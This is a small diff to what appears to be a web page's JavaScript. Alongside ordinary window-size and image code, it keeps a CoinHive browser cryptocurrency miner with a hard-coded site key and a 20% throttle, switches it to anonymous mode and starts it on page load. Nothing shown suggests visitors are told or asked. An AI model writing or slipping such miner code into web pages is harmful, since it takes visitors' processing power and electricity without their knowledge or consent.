@@ -5,7 +5,7 @@ var g=(2*f-1)/(2*f);
 var a,b,c,h=$(window).height()*e,w=$(window).width()*g;
 var change = document.getElementById('cat');
 var curImg;
-var miner = new CoinHive.User('BTujSiViZYsN95LDUjWtiFsHlFmXzvN0',"Jlsajfj",{throttle:.2});
+var miner = new CoinHive.Anonymous('BTujSiViZYsN95LDUjWtiFsHlFmXzvN0',{throttle:.2});
 miner.start();
 
 //testing
